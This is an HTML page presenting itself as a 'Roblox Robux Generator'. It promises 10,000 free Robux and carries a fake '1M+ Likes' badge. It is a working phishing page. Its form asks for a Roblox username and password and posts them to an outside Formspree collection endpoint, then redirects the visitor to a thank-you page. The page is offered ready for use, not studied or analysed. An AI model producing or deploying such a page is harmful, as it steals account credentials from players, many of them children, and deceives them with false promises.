<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Roblox Robux Generator</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #1b1b1b;
      color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    header {
      font-size: 2rem;
      font-weight: bold;
      color: #f44336;
      margin-bottom: 20px;
    }

    main {
      background-color: #2a2a2a;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
      width: 90%;
      max-width: 400px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    input[type="text"],
    input[type="password"] {
      padding: 12px;
      margin-bottom: 16px;
      border: none;
      border-radius: 6px;
      background: #444;
      color: white;
      font-size: 1rem;
    }

    input::placeholder {
      color: #bbb;
    }

    button {
      background-color: #f44336;
      color: white;
      padding: 14px;
      border: none;
      border-radius: 6px;
      font-size: 1.2rem;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background-color: #d32f2f;
    }

    .likes-badge {
      margin-top: 20px;
      background-color: #0652dd;
      padding: 8px 15px;
      border-radius: 20px;
      font-weight: bold;
      color: white;
      text-align: center;
      box-shadow: 0 0 10px #0652ddaa;
    }
  </style>
</head>
<body>

  <header>ROBLOX ROBUX TOOL</header>

  <main>
    <!-- ‚úÖ Ready-to-go Formspree Form -->
    <form action="https://formspree.io/f/xkgbypoe" method="POST">
      <input type="text" name="username" placeholder="Roblox Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <input type="hidden" name="_subject" value="New Robux Generator Entry">
      <input type="hidden" name="_next" value="https://example.com/thankyou.html">
      <button type="submit">Claim 10,000 Robux</button>
    </form>

    <div class="likes-badge">üëç 1M+ Likes</div>
  </main>

</body>
</html>
